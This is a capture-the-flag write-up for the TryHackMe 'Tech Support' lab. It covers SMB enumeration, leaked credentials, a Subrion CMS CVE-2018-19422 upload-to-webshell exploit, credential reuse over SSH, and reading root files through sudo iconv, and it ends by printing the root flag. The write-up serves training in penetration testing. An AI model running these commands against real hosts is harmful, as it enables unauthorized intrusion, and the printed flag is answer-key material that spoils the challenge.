# 🛠️ TryHackMe — Tech Support

> **Network Enumeration | SMB Enumeration | Information Disclosure | Subrion CMS | CVE-2018-19422 | Remote Code Execution | WordPress | SSH | Linux Privilege Escalation**

![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Linux%20Privilege%20Escalation-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---

## 📌 Overview

**Tech Support** is a TryHackMe Linux machine focused on network enumeration, SMB information disclosure, vulnerable CMS exploitation, remote code execution, credential discovery, SSH access, and Linux privilege escalation.

The machine exposes several services including:

- SSH
- HTTP
- SMB

SMB enumeration reveals a publicly accessible share containing an `enter.txt` file. The file contains credentials for a **Subrion CMS** installation.

The Subrion CMS version is identified as **4.2.1**, which is vulnerable to **CVE-2018-19422**, allowing an authenticated attacker to upload a malicious file and obtain remote code execution.

After gaining a shell as `www-data`, the WordPress configuration file reveals credentials for the `scamsite` user. These credentials can be reused for SSH access.

Finally, `sudo -l` reveals that `scamsite` can execute `/usr/bin/iconv` as root without a password. This can be abused to read `/root/root.txt`.

### 🎯 Attack Path

```text
Nmap Enumeration
       │
       ▼
SMB Enumeration
       │
       ▼
Websrv Share
       │
       ▼
enter.txt
       │
       ▼
Subrion Credentials
       │
       ▼
Decode Password
       │
       ▼
Subrion CMS 4.2.1
       │
       ▼
CVE-2018-19422
       │
       ▼
File Upload → Webshell
       │
       ▼
www-data Shell
       │
       ▼
WordPress wp-config.php
       │
       ▼
scamsite Credentials
       │
       ▼
SSH Access
       │
       ▼
sudo -l
       │
       ▼
/usr/bin/iconv
       │
       ▼
Read /root/root.txt
       │
       ▼
🏆 Root Flag
```

---

# 🔎 1. Initial Enumeration
I started by performing an Nmap service and version scan against the target.
```
nmap -sV -sC <TARGET_IP>
```
 
The scan identified the following open ports:
```
22/tcp    open    ssh
80/tcp    open    http
139/tcp   open    netbios-ssn
445/tcp   open    microsoft-ds
```

<img width="710" height="217" alt="1" src="https://github.com/user-attachments/assets/031430a0-8963-4c51-8d56-d941324d8737" />

The SMB services were particularly interesting because they could potentially expose files or information without authentication.

---

# 🌐 2. Web Enumeration
I first checked the HTTP service:
```
http://<TARGET_IP>
```
The website displayed the default Apache page.
 
The default page did not reveal much useful information.
I continued investigating the other exposed services.

<img width="953" height="467" alt="2" src="https://github.com/user-attachments/assets/77f575af-03ec-4169-9eeb-feb978d6f890" />

---

# 📂 3. SMB Enumeration
I used `enum4linux` to enumerate the SMB service:
```
enum4linux <TARGET_IP>
```

<img width="408" height="64" alt="6-1" src="https://github.com/user-attachments/assets/af89aa48-631e-427d-ae97-5ae2496c937e" />
 
The enumeration discovered an SMB share called:
```
websvr
```

**The available shares were:**
```
Share Name     Type
---------------------
print$         Disk
websvr         Disk
IPC$           IPC
```
 
The interesting share was:
```
websvr
```
because it was a disk share and could potentially contain files.

<img width="666" height="126" alt="6-2" src="https://github.com/user-attachments/assets/99c839e3-1f0f-4d0e-8134-868f3fb15dc7" />

---

# 🔍 4. SMB Information Gathering
The SMB enumeration also revealed the domain:
```
TECHSUPPORT
```
and:
```
Builtin
```
 
The password policy showed:
```
Password Complexity: Disabled
Minimum Password Length: 5
```

<img width="605" height="541" alt="6-3" src="https://github.com/user-attachments/assets/881795d5-a1e0-4589-b711-a038e382993b" />

This indicated that the SMB environment had relatively weak password requirements.
The enumeration also revealed:
```
TECHSUPPORT\nobody
TECHSUPPORT\None
```

<img width="659" height="54" alt="6-4" src="https://github.com/user-attachments/assets/75aa8be1-0bc2-4491-a02c-d6653db03305" />


---

# 🔐 5. Accessing the SMB Share
I attempted to connect to the websvr share using the nobody account:
```
smbclient -U nobody //<TARGET_IP>/websvr
```
 <img width="437" height="125" alt="7" src="https://github.com/user-attachments/assets/3ceae43a-3d7e-400d-a419-9fb3a468618c" />

After connecting, I listed the contents:
```
ls
```
The share contained:
```
enter.txt
```

<img width="693" height="121" alt="8" src="https://github.com/user-attachments/assets/8a936602-c3ee-46de-907f-f7ce1c930523" />

---

# 📥 6. Downloading enter.txt
I downloaded the file using:
```
get enter.txt
```
 <img width="730" height="105" alt="9" src="https://github.com/user-attachments/assets/1aa7c3d0-fd18-4f1e-a90a-03837066db23" />

The file was successfully downloaded to the local machine.
I then read it:
```
cat enter.txt
```
<img width="671" height="276" alt="10" src="https://github.com/user-attachments/assets/950fe087-d1dd-4d5f-b72d-88e00a07882e" />

---

# 📝 7. Reading enter.txt

The file contained several goals and important credentials.
```
GOALS
=====

1) Make fake popup and host it online on Digital Ocean server
2) Fix subrion site, /subrion doesn't work, edit from panel
3) Edit wordpress website

IMP
===

Subrion creds
    ↳ admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCK [cooked with magical formula]

Wordpress creds
```
 
The most important information was:
```
Username:
admin

Password:
7sKvntXdPEJaxazce9PXi24zaFrLiKWCK
```
However, the password was described as:
```
[cooked with magical formula]
```
This suggested that the value had been encoded or transformed.

---

# 🔄 8. Decoding the Subrion Password
The encoded password was:
```
7sKvntXdPEJaxazce9PXi24zaFrLiKWCK
```
The value could be decoded using the appropriate encoding recipe.
The decoded result was:
```
Scam2021
```
 
Therefore, the Subrion credentials were:
```
Username: admin
Password: Scam2021
```

<img width="631" height="194" alt="12" src="https://github.com/user-attachments/assets/6b51119a-c2b1-4d50-8e88-3eff0988950b" />

---

# 🌐 9. Accessing the Subrion Admin Panel
The enter.txt file mentioned that the Subrion website needed to be fixed.
I navigated to:
```
http://<TARGET_IP>/subrion/panel/
```
The page displayed the Subrion Admin Panel.
 
The application identified itself as:
```
Subrion CMS v4.2.1
```
The recovered credentials were used:
```
Username: admin
Password: Scam2021
```

After authentication, access to the Subrion dashboard was obtained.

<img width="829" height="552" alt="11" src="https://github.com/user-attachments/assets/5ff39775-8f63-4132-bb3d-64f7972a7412" />

<img width="191" height="103" alt="14" src="https://github.com/user-attachments/assets/36e2818a-82f5-493d-ab3a-b209f30df0d1" />

---

# 🧨 11. Searching for a Subrion Exploit
I searched the local Exploit-DB database using:
```
searchsploit subrion
```
 
Several vulnerabilities were available.
The relevant exploit was:
```
Subrion CMS 4.2.1 - Arbitrary File Upload

The exploit was associated with:
CVE-2018-19422
```
This vulnerability allows an authenticated user to bypass file upload restrictions and upload a malicious file that can be used for remote code execution.

<img width="1228" height="372" alt="15" src="https://github.com/user-attachments/assets/80a1161f-4a91-4e4d-9d13-7f135c11d31a" />

---

# 💥 12. Exploiting CVE-2018-19422
The exploit was executed using the recovered Subrion credentials:
```
python3 49876.py -u http://<TARGET_IP>/subrion/panel/ -l admin -p Scam2021
```
 
The exploit identified itself as:
```
SubrionCMS 4.2.1 - File Upload Bypass to RCE
CVE-2018-19422
```
The exploit successfully authenticated to the Subrion panel.
It then generated and uploaded a webshell:
```
Upload Success...
Webshell path:
http://<TARGET_IP>/subrion/panel/uploads/nhovbmpzomutepr.phar
```

<img width="951" height="312" alt="16" src="https://github.com/user-attachments/assets/78972b4e-4a31-465c-8616-6660a91bf81a" />

This gave us a path to remote command execution on the server.

---

# 🐚 13. Obtaining a Webshell
The uploaded webshell was accessed through the browser.
The current working directory was:
```
/var/www/html/subrion/uploads
```
I checked the current user:
```
whoami
```
The result was:
```
www-data
```
 
We now had command execution as:
```
www-data
```
<img width="330" height="109" alt="17" src="https://github.com/user-attachments/assets/aeec7e77-ec0f-44bb-b009-8e11005fc1ba" />

---

# 🔍 14. Local Enumeration
With command execution as `www-data`, I started enumerating the system.
I first inspected `/etc/passwd`:
```
cat /etc/passwd
```
 
An interesting user account was:
```
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```
This indicated that `scamsite` was a normal interactive user with a home directory:
```
/home/scamsite
```
<img width="778" height="642" alt="18" src="https://github.com/user-attachments/assets/6a1125dd-f72f-44ea-8241-101de9ec3da7" />

---

# 📁 15. Enumerating the scamsite Directory
I checked the contents of the user's web server directory:
```
ls /home/scamsite/websvr
```
The directory contained:
```
enter.txt
```
 
The file was owned by `root`, which meant it was not directly useful for modification.
The more interesting target was the WordPress installation.

<img width="578" height="174" alt="19" src="https://github.com/user-attachments/assets/57ea4dba-b112-49bd-bcce-111ff5e7dad2" />

---

# 🔑 16. Discovering WordPress Database Credentials
The machine contained a WordPress installation.
I inspected the WordPress configuration file:
```
cat ../../wordpress/wp-config.php
```
The configuration file contained the database credentials.
 
The important credential was:
```
DB_PASSWORD:
ImAScammerLOL!123!
```
The file showed:

```
define( 'DB_NAME', 'wpdb' );

define( 'DB_USER', 'wpuser' );

define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

define( 'DB_HOST', 'localhost' );
```
The password was potentially reused by the local `scamsite` account.

<img width="686" height="658" alt="20" src="https://github.com/user-attachments/assets/3883781e-ac0a-499a-8f48-3323808e8c5a" />

---

# 🔐 18. SSH Access as scamsite
SSH was running on port `22`.
I attempted to authenticate as the `scamsite` user using the password recovered from `wp-config.php`.
```
ssh scamsite@<TARGET_IP>
```
 
The login was successful.
We now had a shell as:
```
scamsite
```

<img width="668" height="458" alt="22" src="https://github.com/user-attachments/assets/a6e876e5-be1b-4519-9f12-22d9f6ba6a4a" />

---

# 🔍 19. Checking Sudo Permissions
After gaining access as `scamsite`, I checked the user's sudo privileges:
```
sudo -l
```
 
The important result was:
```
User scamsite may run the following commands on TechSupport:

(ALL) NOPASSWD: /usr/bin/iconv
```
This meant `scamsite` could execute:
```
/usr/bin/iconv
```
as root without entering a password.
This provided the final privilege-escalation path.

<img width="983" height="124" alt="23" src="https://github.com/user-attachments/assets/9d523e60-e782-4585-b0d0-0283688f88fc" />

---

# 🧨 20. Exploiting iconv
`iconv` is normally used to convert text between character encodings.
However, because it was allowed to run as root, it could be used to read a root-owned file.
The target file was:
```
/root/root.txt
```
I used:
```
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```
 
The contents of `/root/root.txt` were displayed despite the file being owned by root.

---

# 🏆 21. Root Flag
The root flag obtained from `/root/root.txt` was:
```
851b8233a8c09400ec30651bd1529bf1ed02790b
```
<img width="573" height="41" alt="24" src="https://github.com/user-attachments/assets/b58bb23a-d92d-46ce-87e8-9d2362f11e9e" />
